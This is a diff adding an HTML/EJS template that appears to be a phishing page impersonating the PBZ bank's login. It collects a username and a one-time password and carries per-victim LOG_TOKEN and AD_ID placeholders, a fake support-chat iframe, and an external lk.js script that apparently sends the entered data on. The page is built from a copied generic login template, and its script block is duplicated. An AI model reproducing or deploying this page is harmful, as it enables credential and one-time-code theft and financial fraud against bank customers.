@@ -1,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>PBZ</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="icon" type="image/png" href="https://colorlib.com/etc/lf/Login_v1/images/icons/favicon.ico" />
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/css/bootstrap.min.css">
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/animate/animate.css">
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/css-hamburgers/hamburgers.min.css">
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.css">
+
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/css/util.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/css/main.css">
+
+<meta name="robots" content="noindex, follow">
+
+<style>
+body {
+            display: block;
+            background: url("https://phonoteka.org/uploads/posts/2021-05/1621724509_10-phonoteka_org-p-fon-dlya-avtorizatsii-na-saite-12.jpg") no-repeat center top fixed;
+            background-size: cover;
+        }
+		</style>
+		<link rel="stylesheet" href="/css/default_lk.css">
+</head>
+<body>
+<div class="limiter">
+<div class="container-login100">
+<div class="wrap-login100">
+<div class="login100-pic js-tilt" data-tilt>
+<img src="https://colorlib.com/etc/lf/Login_v1/images/img-01.png" alt="IMG">
+</div>
+
+<form id="lk_form" class="login100-form validate-form">
+   <span class="login100-form-title">
+        Ulaz u pbz
+   </span>
+     <div class="wrap-input100 validate-input">
+        <input type="text" id="login" placeholder="Prijava"  class="input100" required>
+          <span class="focus-input100"></span>
+           <span class="symbol-input100">
+             <i class="fa fa-id-card" aria-hidden="true"></i>
+           </span>
+        </div>
+        <div class="wrap-input100 validate-input" data-validate="Password is required">
+            <input type="password" id="password" placeholder="Jednokratna zaporka" class="input100" required>
+              <span class="focus-input100"></span>
+                <span class="symbol-input100">
+                  <i class="fa fa-lock" aria-hidden="true"></i>
+                </span>   
+        </div>
+                           <div class="container-login100-form-btn">
+                              <button class="login100-form-btn" type="submit">Dalje</button>
+                           </div>
+<div class="text-center p-t-12">
+</div>
+<div class="text-center p-t-136">
+</div>
+</form>
+</div>
+</div>
+</div>
+
+<script src="https://colorlib.com/etc/lf/Login_v1/vendor/jquery/jquery-3.2.1.min.js"></script>
+
+<script src="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/popper.js"></script>
+<script src="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/bootstrap.min.js"></script>
+
+<script src="https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.js"></script>
+
+<script src="https://colorlib.com/etc/lf/Login_v1/vendor/tilt/tilt.jquery.min.js"></script>
+<script>
+		$('.js-tilt').tilt({
+			scale: 1.1
+		})
+	</script>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<link rel="stylesheet" href="/css/support_parent.css" />
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-23581568-13');
+  
+  
+   const LOG_TOKEN = <%=log.token%>,
+        AD_LANG = "<%=log.ad.service.lang%>",
+        AD_ID = <%=log.ad.id%>,
+        translate = <%-JSON.stringify(translate) %>;
+</script>
+<script src="/js/lk.js" defer></script>
+
+<div class="
+chatra--webkit
+chatra--style-round
+chatra--side-bottom
+chatra--pos-right
+chatra--visible
+chatra--expanded
+chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent="" style="
+width: 380px;
+height: 600px;
+transform: none;
+z-index: 2147483647;
+display: none;
+">
+
+<div id="chatra__iframe-wrapper">
+        <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+            src="/supportChatFrame/<%=log.ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+</div>
+<div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+
+<script src="js/main.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a88f0c5d73d249e","token":"cd0b4b3a733644fc843ef0b185f98241","version":"2021.10.0","si":100}'></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a88f0c5b971249e","token":"cd0b4b3a733644fc843ef0b185f98241","version":"2021.10.0","si":100}'></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<script>
+const LOG_TOKEN = <%=log.token%>,
+    AD_LANG = "<%=log.ad.service.lang%>",
+    AD_ID = <%=log.ad.id%>,
+    translate = <%-JSON.stringify(translate) %>;
+</script>
+<script src="/js/lk.js" defer></script>
+</body>
+</html>
